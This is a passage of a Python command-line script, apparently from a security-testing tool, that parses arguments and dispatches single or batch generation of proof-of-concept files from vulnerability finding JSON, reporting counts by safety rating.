        help="Single finding JSON file to generate PoC for",
    )
    p.add_argument(
        "--findings",
        help="JSON file with array of findings (batch mode)",
    )
    p.add_argument(
        "--format",
        default="all",
        help="Output formats: curl,python,har,markdown,raw_http,all (default: all)",
    )
    p.add_argument(
        "--output",
        default="./poc",
        help="Output path for single-finding mode (default: ./poc)",
    )
    p.add_argument(
        "--output-dir",
        default="./pocs",
        help="Output directory for batch mode (default: ./pocs)",
    )
    return p


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    formats = [f.strip() for f in args.format.split(",")]

    # Batch mode
    if args.findings:
        findings_data = load_json(args.findings)
        if isinstance(findings_data, dict):
            findings = findings_data.get("findings", findings_data.get("results", [findings_data]))
        elif isinstance(findings_data, list):
            findings = findings_data
        else:
            print("[!] Findings file must contain a JSON array or object with 'findings' key.", file=sys.stderr)
            return 1

        result = generate_poc_batch(findings, formats, args.output_dir)
        summary = result.get("safety_summary", {})
        print(f"\n[+] Batch complete: {result['generated']} PoCs generated "
              f"({summary.get('SAFE', 0)} SAFE, "
              f"{summary.get('CAUTION', 0)} CAUTION, "
              f"{summary.get('DANGEROUS', 0)} DANGEROUS)")
        return 0

    # Single-finding mode
    if args.finding:
        result = generate_single_finding(args.finding, formats, args.output)
        return 0

    parser.error("Either --finding or --findings is required.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
